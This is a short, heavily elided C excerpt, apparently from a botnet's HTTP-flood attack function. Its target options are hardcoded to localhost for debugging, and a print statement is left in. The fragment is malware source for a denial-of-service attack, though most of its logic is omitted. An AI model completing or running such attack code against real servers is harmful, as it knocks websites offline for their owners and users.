...
void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    ...
    char *postdata = "LOL"; //attack_get_opt_str(opts_len, opts, ATK_OPT_POST_DATA, NULL);
    char *method = "GET"; // attack_get_opt_str(opts_len, opts, ATK_OPT_METHOD, "GET");
    char *domain = "localhost"; //attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
    char *path = "/"; // attack_get_opt_str(opts_len, opts, ATK_OPT_PATH, "/");
    int sockets = 1; //attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 1);
    port_t dport = 80; //attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
        ...
        if (FD_ISSET(conn->fd, &fdset_rd))
            {
                if (conn->state == HTTP_CONN_RECV_HEADER)
                {
                    ...
                    printf("Before processed %s and size = %d", generic_memes, ret);
